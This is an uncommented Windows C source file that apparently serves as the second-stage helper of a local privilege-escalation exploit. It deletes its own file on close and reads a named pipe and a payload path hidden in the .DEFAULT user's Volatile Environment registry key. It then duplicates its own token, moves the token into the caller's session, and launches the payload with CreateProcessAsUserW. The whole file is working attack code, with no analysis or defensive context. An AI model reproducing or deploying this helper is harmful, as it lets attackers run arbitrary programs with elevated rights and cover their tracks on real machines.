#include <windows.h>

typedef NTSTATUS(NTAPI *PNtSetInformationToken)(HANDLE, int, PVOID, ULONG);

void __stdcall entry() {
  WCHAR selfPath[MAX_PATH];
  WCHAR pipeName[MAX_PATH];
  WCHAR payloadPath[MAX_PATH];

  SetEnvironmentVariableW(L"windir", L"C:\\Windows");

  DWORD len = GetModuleFileNameW(NULL, selfPath, MAX_PATH);
  if (len == 0) ExitProcess(1);

  HANDLE hSelf = CreateFileW(selfPath, DELETE,
      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
      NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
  if (hSelf != INVALID_HANDLE_VALUE) CloseHandle(hSelf);

  HKEY hKey;
  if (RegOpenKeyExW(HKEY_USERS, L".DEFAULT\\Volatile Environment",
          0, KEY_READ, &hKey) != ERROR_SUCCESS)
    ExitProcess(1);

  DWORD type, size = sizeof(pipeName);
  if (RegQueryValueExW(hKey, L"mp_pipe", NULL, &type,
          (LPBYTE)pipeName, &size) != ERROR_SUCCESS || type != REG_SZ) {
    RegCloseKey(hKey);
    ExitProcess(1);
  }

  size = sizeof(payloadPath);
  if (RegQueryValueExW(hKey, L"mp_payload", NULL, &type,
          (LPBYTE)payloadPath, &size) != ERROR_SUCCESS || type != REG_SZ) {
    RegCloseKey(hKey);
    ExitProcess(1);
  }
  RegCloseKey(hKey);

  HANDLE hPipe = CreateFileW(pipeName, GENERIC_READ | GENERIC_WRITE, 0,
      NULL, OPEN_EXISTING, 0, NULL);
  if (hPipe == INVALID_HANDLE_VALUE) ExitProcess(1);

  BYTE signal = 0;
  DWORD written;
  WriteFile(hPipe, &signal, 1, &written, NULL);

  ULONG sessionId;
  if (GetNamedPipeServerSessionId(hPipe, &sessionId)) {
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(),
            TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY |
                TOKEN_ADJUST_DEFAULT,
            &hToken)) {
      HANDLE hNewToken;
      if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
              SecurityImpersonation, TokenPrimary, &hNewToken)) {
        CloseHandle(hToken);

        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) {
          PNtSetInformationToken pNtSetInformationToken =
              (PNtSetInformationToken)GetProcAddress(hNtdll,
                  "NtSetInformationToken");
          if (pNtSetInformationToken)
            pNtSetInformationToken(hNewToken, 12, &sessionId, sizeof(ULONG));
        }

        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        for (SIZE_T i = 0; i < sizeof(si); i++) ((BYTE*)&si)[i] = 0;
        si.cb = sizeof(STARTUPINFOW);

        CreateProcessAsUserW(hNewToken, payloadPath, NULL, NULL, NULL, FALSE,
            0, NULL, NULL, &si, &pi);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hNewToken);
      } else
        CloseHandle(hToken);
    }
  }

  CloseHandle(hPipe);
  ExitProcess(0);
}
